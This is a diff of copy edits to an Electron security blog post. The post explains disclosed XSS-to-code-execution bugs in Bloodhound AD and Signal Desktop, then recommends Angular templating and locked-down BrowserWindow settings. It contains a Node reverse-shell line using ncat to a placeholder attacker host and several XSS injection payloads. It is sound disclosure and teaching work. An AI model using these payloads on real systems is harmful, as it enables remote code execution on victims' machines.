@@ -42,25 +42,25 @@ Author: [Joe](https://twitter.com/LittleJoeTables) from [Bishop Fox](https://bis
 
 _"In the face of ambiguity, refuse the temptation to guess."_ -The Zen of Python
 
-[Electron](https://electronjs.org/) is a cross-platform framework for developing desktop applications using web technologies like HTML, JavaScript, and CSS. Electron has become very popular in recent years for its ease of use, empowering developers to quickly create generally good-looking, responsive, cross-platform desktop applications. Applications from major tech companies like Microsoft Teams, VSCode, Slack, Atom, Spotify, and even secure messaging apps like Signal all use Electron or similar "native web" application frameworks. Electron did not start this trend, embedded webviews have been around for sometime. For example, iMessage is developed using embedded WebKit webviews, which have been [available on macOS and iOS](https://developer.apple.com/documentation/webkit/wkwebview) for years. Similarly, [JavaFX](https://docs.oracle.com/javase/8/javafx/embedded-browser-tutorial/overview.htm) supports embeddable WebKit and [Windows has IE objects](https://msdn.microsoft.com/en-us/windows/desktop/aa752084) that can be embedded in third-party applications. For one reason or another, Electron applications unlike the others often garner a fervent hatred, but truth be told, Electron remains a viable and pragmatic choice for those who value development time more than their user's RAM.
+[Electron](https://electronjs.org/) is a cross-platform framework for developing desktop applications using web technologies like HTML, JavaScript, and CSS. Electron has become very popular in recent years for its ease of use, empowering developers to quickly create generally good-looking, responsive, cross-platform desktop applications. Applications from major tech companies like Microsoft Teams, VSCode, Slack, Atom, Spotify, and even secure messaging apps like Signal all use Electron or similar "native web" application frameworks. Electron did not start this trend — embedded webviews have been around for some time. For example, iMessage is developed using embedded WebKit webviews, which have been [available on macOS and iOS](https://developer.apple.com/documentation/webkit/wkwebview) for years. Similarly, [JavaFX](https://docs.oracle.com/javase/8/javafx/embedded-browser-tutorial/overview.htm) supports embeddable WebKit and [Windows has IE objects](https://msdn.microsoft.com/en-us/windows/desktop/aa752084) that can be embedded in third-party applications. For one reason or another, Electron applications (unlike the others) often garner a fervent hatred, but truth be told, Electron remains a viable and pragmatic choice for those who value development time more than their user's RAM.
 
-Electron is also often regarded as "inherently insecure." While this reputation is not entirely undeserved, application security is far more dependent on engineering practices than it is on the underlying framework. That's not to say the frameworks you choose have no bearing on security; it is possible to write secure PHP code, but [due to the language's often unintuitive design it's not easy](https://eev.ee/blog/2012/04/09/php-a-fractal-of-bad-design/) (and yes I'm aware a lot of this was fixed in PHP v7, but it's fun to beat a dead horse). Similarly, it's possible to write secure Electron applications, though we may need to keep an eye out for a variety of pitfalls as we'll explore.
+Electron is also often regarded as "inherently insecure." While this reputation is not entirely undeserved, application security is far more dependent on engineering practices than it is on the underlying framework. That's not to say the frameworks you choose have no bearing on security; it is possible to write secure PHP code, but  [due to the language's often unintuitive design it's not easy](https://eev.ee/blog/2012/04/09/php-a-fractal-of-bad-design/) (and yes I'm aware a lot of this was fixed in PHP v7, but it's fun to beat a dead horse). Similarly, it's possible to write secure Electron applications, though we may need to keep an eye out for a variety of pitfalls as we'll explore.
 
-In [Part 1](#part-1---out-of-the-browser-into-the-fire) we'll examine how various Electron exploitation techniques work, focusing primarily on cross-site scripting. In [Part 2](#part-2---reasonably-secure) we'll dive into how to design applications that can defend against these types of attacks, including a functional example  pattern that's _reasonably secure_. [Part 2](#part-2---reasonably-secure) is based on lessons learned from building the (yet unreleased) GUI for [Sliver](https://github.com/BishopFox/sliver), an implant framework for red teams a colleague and I have been building in our spare time.
+In [Part 1](#part-1---out-of-the-browser-into-the-fire) we'll examine how various Electron exploitation techniques work, focusing primarily on cross-site scripting. In [Part 2](#part-2---reasonably-secure) we'll dive into how to design applications that can defend against these types of attacks, including a functional example  pattern that's _reasonably secure_. [Part 2](#part-2---reasonably-secure) is based on lessons learned from building the (yet unreleased) GUI for [Sliver](https://github.com/BishopFox/sliver), an implant framework for red teams that [Ronan Kervella](https://twitter.com/rkervell) and I have been building in our spare time.
 
 ## Part 1 - Out of the Browser Into the Fire
 
-Since Electron applications are built on web application technologies, unsurprisingly they're often vulnerable to the same flaws found in your everyday web application. In the past, web application flaws have generally been confined to the browser's sandbox, but no such limitations exist (by default) in Electron. This change has led to a significant increase in the impact that a cross-site scripting (XSS) bug can have, since the attacker now gains access to the NodeJS APIs. Back in 2016, [Matt Bryant](https://twitter.com/IAmMandatory), [Shubs Shah](https://twitter.com/infosec_au), and I released some research on finding and exploiting these vulnerabilities in Electron and other native web frameworks. We demonstrated remote code execution vulnerabilities in Textual IRC, Azure Storage Explorer, and multiple markdown editors, as well as a flaw that allowed [remote disclosure of all iMessage data](https://know.bishopfox.com/blog/2016/04/if-you-cant-break-crypto-break-the-client-recovery-of-plaintext-imessage-data) on macOS, and created a cross-platform self-propagating worm in RocketChat in our presentation at [Kiwicon](https://www.kiwicon.org/).
+Since Electron applications are built on web application technologies, it’s no surprise that they’re often vulnerable to the same flaws found in your everyday web application. In the past, web application flaws have generally been confined to the browser's sandbox, but no such limitations exist (by default) in Electron. This change has led to a significant increase in the impact that a cross-site scripting (XSS) bug can have, since the attacker now gains access to the NodeJS APIs. Back in 2016, [Matt Bryant](https://twitter.com/IAmMandatory), [Shubs Shah](https://twitter.com/infosec_au), and I released some research on finding and exploiting these vulnerabilities in Electron and other native web frameworks. We demonstrated remote code execution vulnerabilities in Textual IRC, Azure Storage Explorer, and multiple markdown editors, as well as a flaw that allowed [remote disclosure of all iMessage data](https://know.bishopfox.com/blog/2016/04/if-you-cant-break-crypto-break-the-client-recovery-of-plaintext-imessage-data) on macOS, and created a cross-platform self-propagating worm in RocketChat in our presentation at [Kiwicon](https://www.kiwicon.org/).
 
-But what is the root cause of XSS and why is it so hard to prevent? There's a common misconception that the proper fix for a cross-site scripting is sanitizing user input. The notion that sanitizing user input can concretely fix an XSS issue is untrue, the only proper fix for XSS is contextual output encoding. That said, it's still a good idea to sanitize user input so do that too (and be sure to sanitize with a whitelist, not a blacklist) --but you need to ensure it's done _in addition to proper output encoding_. A good rule of thumb is: "sanitize input, encode output," but what does contextual encoding entail? Let's explore the details of a couple recent exploits to better understand how XSS manifests and how to prevent it.
+But what is the root cause of XSS and why is it so hard to prevent? There's a common misconception that the proper fix for a cross-site scripting is sanitizing user input. The notion that sanitizing user input can concretely fix an XSS issue is untrue; the only proper fix for XSS is contextual output encoding. Of course it's still a good idea to sanitize user input, so do that too (with a whitelist, not a blacklist) —but do that in addition to proper output encoding. A good rule of thumb is: "sanitize input, encode output," but what does contextual encoding entail? Let's explore the details of a couple recent exploits to better understand how XSS manifests and how to prevent it.
 
 ### Bloodhound AD
 
 We'll first look at a couple vulnerabilities I found in the Bloodhound AD tool, one of which was independently discovered by [Fab](https://github.com/BloodHoundAD/BloodHound/issues/267).
 
-Bloodhound is an incredibly powerful tool for analyzing the structure of Windows Active Directory deployments, and finding ways to exploit the various privilege relationships therein. The attacker (or defender) runs an ingestor script that dumps data from Active Directory into JSON. The JSON is then parsed into a Neo4j database, and an Electron GUI can be used to query and view the results in a nice graph view. A quick look at the code reveals the application is primarily based on [React](https://reactjs.org/). React, generally speaking and for reasons we'll discuss later, is very good at preventing cross-site scripting attacks, but edge cases do exist. Such an edge case is the use of the `dangerouslySetInnerHTML()` function. This function is similar in functionality to a DOM element's `.innerHTML` (also dangerous); the function takes in a string and parses it as HTML.
+Bloodhound is an incredibly powerful tool for analyzing the structure of Windows Active Directory deployments, and finding ways to exploit the various privilege relationships therein. To start, the attacker (or defender) runs an ingestor script that dumps data from Active Directory into JSON. The JSON is then parsed into a Neo4j database, and an Electron GUI can be used to query and view the results in a nice graph view. A quick look at the code reveals the application is primarily based on [React](https://reactjs.org/). React, generally speaking and for reasons we'll discuss later, is very good at preventing cross-site scripting attacks, but edge cases do exist. Such an edge case is the use of the `dangerouslySetInnerHTML()` function. This function is similar in functionality to a DOM element's `.innerHTML` (also dangerous); the function takes in a string and parses it as HTML.
 
-Using candidate point analysis, a quick search of the unpatched [Bloodhound AD](https://github.com/BloodHoundAD/BloodHound/tree/a7ea5363870d925bc31d3a441a361f38b0aadd0b) codebase and we find four instances of this function being used, excerpt below:
+Using candidate point analysis, we first perform a quick search of the unpatched [Bloodhound AD](https://github.com/BloodHoundAD/BloodHound/tree/a7ea5363870d925bc31d3a441a361f38b0aadd0b) codebase and find four instances of this function being used, one excerpt below:
 
 #### [`HelpModal.jsx`](https://github.com/BloodHoundAD/BloodHound/blob/a7ea5363870d925bc31d3a441a361f38b0aadd0b/src/components/Modals/HelpModal.jsx#L1988)
 ```jsx
@@ -123,15 +123,15 @@ const { spawn } = require('child_process');
 spawn('ncat', ['-e', '/bin/bash', '<attacker host>', '<some port>']);
 ```
 
-Since the GPO name is not properly encoded, it will be rendered by the DOM as HTML, and Electron will parse the `<SCRIPT` tag and dutifully retrieve and execute the context of `poc.js`. As discussed before, since the NodeJS APIs are enabled this attacker-controlled JavaScript can simply spawn a bash child process and execute arbitrary native code on the machine.
+Since the GPO name is not properly encoded, it will be rendered by the DOM as HTML, and Electron will parse the `<script>` tag and dutifully retrieve and execute the context of `poc.js`. As discussed before, since the NodeJS APIs are enabled, this attacker-controlled JavaScript can simply spawn a Bash child process and execute arbitrary native code on the machine.
 
-A reasonable scenario here would be blue teams hiding malicious values in their AD deployment waiting for the red team to run Bloodhound, and subsequently exploit the red team operator's machine. Though blue teams often also run this tool, so were a red team operator in a position to influence the data collected by Bloodhound, but otherwise had limited access to AD the exploit could go in the traditional direction too.
+A reasonable scenario for this exploit would be a blue team hiding malicious values in their AD deployment, waiting for the red team to run Bloodhound, and subsequently exploiting the red team operator's machine. From the opposite side, a red team operator in a position to influence the data collected by Bloodhound (but with otherwise limited access to AD) could exploit this in the traditional direction too.
 
 The most comprehensive fix for this vulnerability would be to re-write the functionality such that `dangerouslySetInnerHTML` is not needed. However, from a practical perspective, a lot of code would need to be refactored. A short term and effective fix is to HTML encode the attacker-controlled variables. By HTML encoding these values, we can ensure these strings are never interpreted by the browser as actual HTML, and can support arbitrary characters. The prior payload: `aaaaaa<SCRIPT SRC="http://example.com/poc.js">` will be encoded as `aaaaaa&lt;SCRIPT SRC="http://example.com/poc.js"&gt;` and will be displayed as `aaaaaa<SCRIPT SRC="http://example.com/poc.js">` but not interpreted as HTML. So is preventing cross-site scripting a simple matter of HTML encoding attacker-controlled values? Unfortunately no.
 
 In another area of the application the [Mustache](https://mustache.github.io/) template library is used to render tool tips. The Mustache library HTML encodes by default, another potential fix for the prior vulnerability would be to switch from string interpolation to Mustache templates. However, as we discussed the proper fix is _contextual encoding_, not blanket HTML encoding. HTML encoding will prevent XSS in an HTML context, but when used outside of an HTML context it will fail, or only coincidentally prevent XSS.
 
-Looking at the usage of Mustache in Bloodhound we see that a few values are passed to the tooltips, notably `label` is attacker controlled:
+Looking at the usage of Mustache in Bloodhound, we see that a few values are passed to the tooltips, notably `label` is attacker-controlled:
 
 #### [`nodeTooltip.html`](https://github.com/BloodHoundAD/BloodHound/blob/a7ea5363870d925bc31d3a441a361f38b0aadd0b/src/components/nodeTooltip.html)
 ```html
@@ -206,9 +206,9 @@ Given this information, it may stand to reason that the JavaScript code we'll en
 emitter.emit('setStart', 'someType:a&#39;); alert(1);&#x2F;&#x2F;&#39;')
 ```
 
-So is this exploitable? Yeap, it actually is! Due to the [order in which a browser decodes and interprets values](https://html.spec.whatwg.org/multipage/parsing.html). Attributes are always decoded before they are interpreted as values, which means the browser will decode `&#39;` back into `'` for us prior to parsing the attribute as JavaScript. By the time the JavaScript interpreter parses the code, it will be valid and we can inject attacker-controlled code. This is what we mean when we talk about _contextual entity encoding_. You must account for all of the context(s) —oftentimes multiple nested contexts— in which a value will be interpreted. Getting not just the encoding correct, but often the ordering the encodings correct, is a non-trivial problem. But fret not! We can usually avoid this problem altogether, but more on that later.
+So is this exploitable? Yeap, it actually is! It’s exploitable because of the [order in which a browser decodes and interprets values](https://html.spec.whatwg.org/multipage/parsing.html). Attributes are always decoded before they are interpreted as values, which means the browser will decode `&#39;` back into `'` for us prior to parsing the attribute as JavaScript. By the time the JavaScript interpreter parses the code, it will be valid and we can inject attacker-controlled code. This is what we mean when we talk about _contextual entity encoding_. You must account for all of the contexts —oftentimes multiple nested contexts— in which a value will be interpreted. Getting not just the encoding correct, but often the ordering the encodings correct, is a non-trivial problem. But fret not! We can usually avoid this problem altogether, but more on that later in Part 2.
 
-This also touches on why sanitizing user input can be a problematic fix for injection issues. It's rare that at the time of accepting user input we know exactly what context(s) the values will be used in later. For example, if we sanitized `label` for XSS by removing HTML control characters such as `<` and `>`, we'd still be left with an exploitable XSS vulnerability. If we go further and remove `'`, `"`, `}`, and `)`, are we certain there's not a third or even forth context where `label` is used that may be vulnerable? This leads us to why you should always use whitelist sanitization, not a blacklist. Whitelist sanitization routines will better account for unintended contexts and other side effects. Regardless, neither is ideal if these characters are valid in a GPO name and we reject GPO names that contain these characters or remove the characters from the name, we'll have a functionality issue in that we cannot properly display the name as intended. This is why proper contextual encoding must be used to meet both our functional and security requirements.
+This also touches on why sanitizing user input can be a problematic fix for injection issues. It's rare that at the time of accepting user input we know exactly what context(s) the values will be used in later. For example, if we sanitized `label` for XSS by removing HTML control characters such as `<` and `>`, we'd still be left with an exploitable XSS vulnerability. If we go further and remove `'`, `"`, `}`, and `)`, are we certain there's not a third or even forth context where `label` is used that may be vulnerable? This leads us to why you should always use whitelist sanitization, not a blacklist. Whitelist sanitization routines do a better job of accounting for unintended contexts and other side effects. Regardless, neither is ideal. If punctuation characters are valid in a GPO name and we reject GPO names that contain these characters or remove the characters from the name, we'll have a functionality issue that stops us from properly displaying the name as intended. This is why proper contextual encoding must be used to achieve both our functional and security requirements.
 
 ### Signal Desktop
 
@@ -250,9 +250,12 @@ This meant that message content and quoted messages that contained HTML tags wou
 >
 ```
 
-In this case, what _appears_ to be the primary hurdle the attacker must get over is the `script-src 'self'` line. This CSP policy blocks JavaScript (including inline JavaScript) unless it is loaded from the application's current origin. The browser's same origin policy (SOP) defines origins using protocol, host, and port. For instance, with an origin of `http://example.com` would have a protocol of `http:` host of `example.com` and an implicit port 80, which would be considered a distinct origin from `https://example.com` since the protocol nor the port (now an implicit 443) do not match. So if an application loaded from the `https://example.com` origin defines a CSP with a script directive of `script-src 'self'`, only JavaScript loaded from `https://example.com` would be allowed to execute, and anything else (including for example `http://example.com/foobar.js`) would be blocked.
+In this case, what _appears_ to be the primary hurdle the attacker must get over is the `script-src 'self'` line. This CSP policy blocks JavaScript (including inline JavaScript) unless it is loaded from the application's current origin. The browser's same origin policy (SOP) defines origins using protocol, host, and port. 
 
-So what origin does an Electron application run in, since there's no HTTP server? Well since the application is loaded from the user's file system the origin of an Electron application will default to a file URI, as shown below:
+> For instance, with an origin of `http://example.com` would have a protocol of `http:` host of `example.com` and an implicit port 80, which would be considered a distinct origin from `https://example.com` since the protocol nor the port (now an implicit 443) do not match.
+> So if an application loaded from the `https://example.com` origin defines a CSP with a script directive of `script-src 'self'`, only JavaScript loaded from `https://example.com` would be allowed to execute, and anything else (including for example `http://example.com/foobar.js`) would be blocked.
+
+So what origin does an Electron application run in, since there's no HTTP server? Well since the application is loaded from the user's filesystem, the origin of an Electron application will default to a file URI, as shown below:
 
 ![File Origin](blog/images/file-origin.gif)
 
@@ -266,15 +269,15 @@ This means that in the context of Signal Desktop's CSP that `'self'` equates to 
 
 This payload loads an HTML file into an iframe from a UNC path, which does not violate the application's CSP since it's from the `file://` origin. Once loaded the child frame can execute native code in the context of the application since there are no more `script-src` restrictions.
 
-This exploit is an excellent example of the limitations of CSPs. A CSP _cannot_ prevent XSS; it can however complicate/limit the exploitation process, or make an otherwise exploitable bug unexploitable. CSP is a seatbelt; depending upon the severity of a crash it can and very well may save you, but it's not perfect. And it's not the 80s anymore, so wear your damn seatbelt.
+This exploit is an excellent example of the limitations of CSPs. A CSP _cannot_ prevent XSS; it can however complicate/limit the exploitation process, or make an otherwise exploitable bug unexploitable. CSP is a seatbelt; depending upon the severity of a crash it can and very well may save you but it's not perfect. And it's not the 80s anymore, so wear your damn seatbelt.
 
 ### What's in a Name?
 
-A function by any other name could be so vulnerable. The flaws in both Signal and Bloodhound AD stemmed from the use of [React](https://reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml)'s `dangerouslySetInnerHTML` function, which despite its name is seemingly used with reckless abandon. Clearly the React developers didn't go far enough calling the function "dangerous" and should have chosen the equally appropriate name `iDoNotCareAboutSecurityPlzHackMe()`.
+A function by any other name would be so vulnerable. The flaws in both Signal and Bloodhound stemmed from the use of [React](https://reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml)'s `dangerouslySetInnerHTML` function, which despite its name is seemingly used with reckless abandon. Clearly the React developers didn't go far enough calling the function "dangerous" and should have chosen the equally appropriate name `iDoNotCareAboutSecurityPlzHackMe()`.
 
-All of the aforementioned bugs are at their core cross-site scripting (XSS) vulnerabilities, which is a terrible name. Cross-site scripting is a actually a JavaScript _injection vulnerability_. All injection vulnerabilities occur when the "computer" cannot properly differentiate between what is data and what is an instruction, and subsequently allows an attacker to trick the "computer" into misinterpreting attacker-controlled data as instructions. This can be said about XSS, SQL injection, command injection, etc. The core mechanics of all these vulnerabilities are actually the same, save for what the "computer" is.
+All of the aforementioned bugs are at their core cross-site scripting (XSS) vulnerabilities, which is another terrible name. Cross-site scripting is a actually a JavaScript _injection vulnerability_. All injection vulnerabilities occur when the "computer" cannot properly differentiate between what is data and what is an instruction, and subsequently allows an attacker to trick the "computer" into misinterpreting attacker-controlled data as instructions. This can be said about XSS, SQL injection, command injection, and more. The core mechanics of all these vulnerabilities are actually the same, save for what the "computer" is.
 
-The "computer" in a SQL injection is the SQL interpreter, and in the context of XSS it's the Document Object Model (DOM). If you've ever wondered the logical reason why prepared statements are not vulnerable to SQL injection, it is principally because in prepared statements there is always a separation of the query logic (instructions) from the data (parameters). Thus there is no ambiguity between instruction and data for an attacker to abuse:
+The "computer" in a SQL injection is the SQL interpreter, and in the context of XSS it's the Document Object Model (DOM). If you've ever wondered the logical reason why prepared statements are not vulnerable to SQL injection, it is principally because in prepared statements there is always a separation of the query logic (instructions) from the data (parameters). Thus there is no ambiguity between instruction and data for an attacker to take advantage of:
 
 ```php
 $stmt = $conn->prepare("INSERT INTO Users (firstname, lastname, email) VALUES (?, ?, ?)");
@@ -287,29 +290,29 @@ So is CSP the DOM analog to SQL prepared statements? Not really, CSP allows the 
 
 ### There's No Real Security in the Real World
 
-As we've seen in [Part 1](#part-1---out-of-the-browser-into-the-fire), there's no security silver bullet. HTML encoding can fail, input sanitization can fail, content security policy can fail, prepared statements can fail, sandboxes fail, DEP ASLR SafeSEH and Control Flow Guard can all fail; no one control can prevent an attack, but that doesn't mean any of these technologies aren't worth using. Just as an aeronautical engineer must design a plane to survive rare but inevitable mechanical failures, so too we must engineer our applications to be robust against security failures. We must assume everything is hackable and it’s simply a matter of time and/or resources before someone finds a flaw, and in practice, this is always the case.
+As we've seen in [Part 1](#part-1---out-of-the-browser-into-the-fire), there's no security silver bullet. HTML encoding can fail, input sanitization can fail, content security policy can fail, prepared statements can fail, sandboxes fail, DEP, ASLR, SafeSEH, and Control Flow Guard can all fail; no one control can prevent an attack, but that doesn't mean any of these technologies aren't worth using. Just as an aeronautical engineer must design a plane to survive rare but inevitable mechanical failures, so we too must engineer our applications to be robust against security failures. We must assume everything is hackable and it’s simply a matter of time and/or resources before someone finds a flaw, and in practice, this is always the case.
 
 Our only recourse is to is to add to the time and resources necessary to complete an attack. To that end, we have one major advantage: we get to stack the deck.
 
 ## Part 2 - Stacking the Deck
 
-In this repository you'll find my functional example of a "reasonably secure" Electron application pattern. Based on my personal preference, the example application uses Angular and TypeScript. It's based on the design I've been using for the unreleased [Sliver](https://github.com/BishopFox/sliver) GUI. However, everything in this post is also equally applicable to React if that is your preference. I highly recommend selecting one of these two frameworks for reasons discussed below.
+In this GitHub repository, you'll find my functional example of a "reasonably secure" Electron application pattern. Based on my personal preference, the example application uses Angular and TypeScript. It's based on the design I've been using for the unreleased [Sliver](https://github.com/BishopFox/sliver) GUI. However, everything in this post is also equally applicable to React if that is your preference. I highly recommend selecting one of these two frameworks for reasons discussed below.
 
 ### Security, the Hard Way
 
-So, what is the analog for a SQL prepared statement in the DOM? Is there a way to dynamically build a DOM using only safe methods? Yes! But, let's build upon a naive first approach. The least safe way to dynamically construct a DOM is with JavaScript string interpolation or string concatenation:
+So, what is the analog for a SQL prepared statement in the DOM? Is there a way to dynamically build a DOM using only safe methods? Yes! But, let's start building with a naive approach first. The least safe way to dynamically construct a DOM is with JavaScript string interpolation or string concatenation:
 
 ```javascript
 document.body.innerHTML = `<strong>${title}</strong>` + `<a href="${userInput}">click me</a>`;
 ```
 
-As we've seen before, `.innerHTML` (just like `dangerouslySetInnerHTML()`) offers no protections what-so-ever. There is no distinction between data and instruction, and the browser will render anything that is handed to it. This method of dynamically adding content to a page should be avoided at all times. A slightly better approach, as we've also seen is to use a template library like Mustache that HTML encodes by default:
+As we've seen before, `.innerHTML` (just like `dangerouslySetInnerHTML()`) offers no protections what-so-ever. There is no distinction between data and instruction, and the browser will render anything that is handed to it. This method of dynamically adding content to a page should be avoided at all times. A slightly better approach, as we've also seen, is to use a template library like Mustache that HTML-encodes variables by default:
 
 ```javascript
 document.body.innerHTML = mustache.render('<strong>{{title}}</strong><a href="{{userInput}}">click me</a>', {title: 'foo', userInput: 'bar'});
 ```
 
-Just as before, this approach is better, but subtle mistakes still leave the application vulnerable to XSS (the example above is exploitable). Part of the reason for this is that Mustache only parses the `{{`, `}}`, and other directives it knows about. While `{{foo}}` values get encoded, they're blindly HTML encoded, and string substitution is used to construct the final string. Mustache doesn't even care if the source string is valid HTML:
+Just as before, this approach is better, but subtle mistakes still leave the application vulnerable to XSS (the example above is exploitable). Part of the reason for this is that Mustache only parses directives it knows about, like `{{`, `}}`. While `{{foo}}` values get encoded, they're blindly HTML encoded, and string substitution is used to construct the final string. Mustache doesn't even care if the source string is valid HTML:
 
 ```text
 > mustache.render("<asdf></afwioj>{{a}}&foobar<a><b><c>", {a: 'foobar'});
@@ -327,7 +330,7 @@ btn.innerText = "Hello world";
 document.body.appendChild(btn);
 ```
 
-This approach is still not perfect, for example assigning an `href` attribute to user-controlled content will still result in XSS (e.g. `javascript:alert(1)`), but due to the lack of string manipulation when constructing the DOM hierarchy, we've eliminated the vast majority of injection points. We also don't have to worry about nested encodings as the browser's `.setAttribute()` will handle that for us. However, it's paramount that we do not use string interpolation/concatenation _anywhere_. For example, the following use of string interpolation will still be vulnerable:
+This approach is still not perfect, for example assigning an `href` attribute to user-controlled content will still result in XSS (e.g. `javascript:alert(1)`), but due to the lack of string manipulation when constructing the DOM hierarchy, we've eliminated the vast majority of injection points. We also don't have to worry about nested encodings as the browser's `.setAttribute()` will handle that for us. However, it's paramount that we do not use string interpolation/concatenation anywhere because it will still be vulnerable, as in this use of string interpolation:
 
 ```javascript
 let btn = document.createElement("button");
@@ -342,29 +345,29 @@ btn.setAttribute("data", userInput)
 btn.setAttribute("onclick", `foobar(event.srcElement.attributes['data'].value)`);
 ```
 
-This approach is obviously far more verbose code-wise, which is why it's so common to just use string manipulation when building the DOM. There are also future standards, such as "Trusted Types" proposed by Google to help make a better distinction between data and instructions when performing native browser DOM updates:
+This approach is obviously far more verbose code-wise, which is why it's so common to just use string manipulation when building the DOM. In the future there may be more succinct ways to perform this operation. Experimental standards, such as "Trusted Types" proposed by Google help make a better distinction between data and instructions when performing native browser DOM updates:
 
 > [Trusted Types](https://developers.google.com/web/updates/2019/02/trusted-types) allow you to lock down the dangerous injection sinks - they stop being insecure by default, _and cannot be called with strings_."
 
-But this has yet to be standardized, so it's more of a footnote on what's to come. In the meantime, is there any way to get the safety of this approach with the ease of use of the templated approach?  Yes, the "Virtual DOM" --or "Incremental DOM" or whatever hip new word people are using. Basically [React's JSX](https://reactjs.org/docs/jsx-in-depth.html) and [Angular's](https://angular.io/guide/aot-compiler) templates. As Kara Erikson explains in her recent talk on the [Angular compiler](https://youtu.be/bEYhD5zHPvo?t=18624), Angular templates are _lexically parsed_ and converted into function calls to `document.createElement` and related APIs:
+But this has yet to be standardized, so it's more of a footnote on what's to come. In the meantime, is there any way to get the safety of this approach with the ease of use of the templated approach? Yes, the "Virtual DOM" --or "Incremental DOM" or whatever hip new word people are using. (Basically  [React's JSX](https://reactjs.org/docs/jsx-in-depth.html) and [Angular's](https://angular.io/guide/aot-compiler) templates.) As Kara Erikson explains in her recent talk on the [Angular compiler](https://youtu.be/bEYhD5zHPvo?t=18624), Angular templates are _lexically parsed_ and converted into function calls to `document.createElement` and related APIs:
 
 ![Angular Compiler](blog/images/angular-connect-0.png)
 
 This leaves no ambiguity for an attacker to construct an injection vulnerability, and is one of the main reasons it's so hard to find XSS vulnerabilities in Angular (2+) and React-based applications. Since the templates are lexically parsed, the framework knows the exact context in which a given value will be used, and can implement the correct encoding and/or sanitization routines: `property('name', ctx.name)` in the example above. Well, at least the applications that don't use React's `dangerouslySetInnerHTML()` and Angular's counterpart, [`bypassSecurityTrustHtml()`](https://angular.io/api/platform-browser/DomSanitizer#bypassSecurityTrustHtml).
 
-This is our first and most important design choice when it comes to building our reasonably secure Electron application. We will __never__ directly interact with the DOM, and instead defer to Angular to handle that interaction for us. Additionally, we will __never__ call `bypassSecurityTrustHtml()` or any related function. By avoiding any direct interaction with the DOM, we make an attacker's job incredibly hard.
+This is our first and most important design choice when it comes to building our reasonably secure Electron application. We will never directly interact with the DOM, and instead defer to Angular to handle that interaction for us. Additionally, we will never call `bypassSecurityTrustHtml()` or any related function. By avoiding any direct interaction with the DOM, we make an attacker's job incredibly hard.
 
 ### Playing in the Sandbox
 
 Next, we must assume relying upon Angular/React will eventually fail, which is a pretty good bet. While our own code may adhere to the strict guidelines set forth, we have no assurance that the infinite depths of our `node_modules/` directory will contain only safe code.
 
-Since a cross-site scripting vulnerability will result in the attacker's code executing in the same context as our own code, (i.e., in the context of the DOM), we must impose limitations our own code. Electron can actually facilitate this. By default, Electron applications have two or more processes: the 'main process', and one or more 'renderer' processes. The main process is a simple Node process like any other, by using the Electron APIs, this process creates the `BrowserWindow`s (the renderer processes). The renderer processes communicate with the main process using [inter-process communication](https://electronjs.org/docs/api/ipc-main) (IPC), which is also provided by Electron:
+Since a cross-site scripting vulnerability will result in the attacker's code executing in the same context as our own code, (i.e., in the context of the DOM), we must impose limitations our own code. Electron can actually facilitate this. By default, Electron applications have two or more processes: the “main process,” and one or more “renderer” processes. The main process is a simple Node process like any other, by using the Electron APIs, this process creates the `BrowserWindow`s (the renderer processes). The renderer processes communicate with the main process using [inter-process communication](https://electronjs.org/docs/api/ipc-main) (IPC), which is also provided by Electron:
 
 ```text
 [ Main Process (Node) ] <--IPC--> [ Renderer Process (DOM) ]
 ```
 
-The first step will be to entirely disable access to the Node APIs from within the renderer process, and instead selectively expose functionality to the renderer. In the event our application is vulnerable to XSS, the attacker will no longer be able to immediately execute native code. You may think this defeats the reasons we'd using Electron, but stick with me.
+The first step will be to entirely disable access to the Node APIs from within the renderer process, and instead selectively expose functionality to the renderer. In the event that our application is vulnerable to XSS, the attacker will no longer be able to immediately execute native code. You may think this defeats the reasons we'd using Electron, but stick with me.
 
 The [Electron documentation](https://electronjs.org/docs/api/browser-window#new-browserwindowoptions) for `BrowserWindow` isn't super detailed on what all of these flags do, but let's go through them one by one. So far as I can tell, these are the flags you want to set to properly restrict your webviews from executing native code. Some of these are the defaults, but I've explicitly set them out of an abundance of caution against future changes to the default settings:
 
@@ -372,17 +375,18 @@ The [Electron documentation](https://electronjs.org/docs/api/browser-window#new-
 ```typescript
 const mainWindow = new BrowserWindow({
   webPreferences: {
-    sandbox: true,
-    webSecurity: true,
-    contextIsolation: true,
-    webviewTag: false,
-    enableRemoteModule: false,
     allowRunningInsecureContent: false,
+    contextIsolation: true,
+    enableRemoteModule: false,
+    nativeWindowOpen: false,
     nodeIntegration: false,
     nodeIntegrationInWorker: false,
     nodeIntegrationInSubFrames: false,
-    nativeWindowOpen: false,
     safeDialogs: true,
+    sandbox: true,
+    webSecurity: true,
+    webviewTag: false,
+
     preload: path.join(__dirname, 'preload.js'),
   },
 });
@@ -390,23 +394,23 @@ const mainWindow = new BrowserWindow({
 
 These are largely taken directly from the Electron documentation, but I've editorialized some of it based on my understanding. These are all Boolean flags:
 
-* `sandbox` - Whether to enable the sandbox renderer associated with the window, making it compatible with the Chromium OS-level sandbox and disabling the Node.js engine. This is not the same as the `nodeIntegration` option and the APIs available to the preload script are more limited.
-* `webSecurity` - Whether to enable the same origin policy (SOP), setting this to `false` will kill the kitten nearest to you.
-* `contextIsolation` - Whether to run Electron APIs and the specified preload script in a separate JavaScript context. This is disabled by default, but you should always set this to `true` to protect against prototype tampering.
-* `webviewTag` - Whether to enable the `<webview>` tag. These tags are exceedingly dangerous, you should always disable this feature.
-* `enableRemoteModule` - Whether to enable the [remote module](https://medium.com/@nornagon/electrons-remote-module-considered-harmful-70d69500f31). This module is dangerous, and should be disabled whenever possible, we'll talk about a far safer approach to IPC in a bit.
 * `allowRunningInsecureContent` - Allow an https page to run JavaScript, CSS, or plugins from http URLs. Default is `false`, but y'all go ahead and double tap this one.
+* `contextIsolation` - Whether to run Electron APIs and the specified preload script in a separate JavaScript context. This is disabled by default, but you should always set this to `true` to protect against prototype tampering.
+* `enableRemoteModule` - Whether to enable the [remote module](https://medium.com/@nornagon/electrons-remote-module-considered-harmful-70d69500f31). This module is dangerous, and should be disabled whenever possible, we'll talk about a far safer approach to IPC in a bit.
+* `nativeWindowOpen` - Whether to use native `window.open()`, because what could go wrong? Defaults to `false`.
 * `nodeIntegration` -  Gives the DOM access to the NodeJS APIs. Recklessly defaults to `true`, always set this to `false`.
 * `nodeIntegrationInWorker` - Whether node integration is enabled in web workers. Default is `false`.
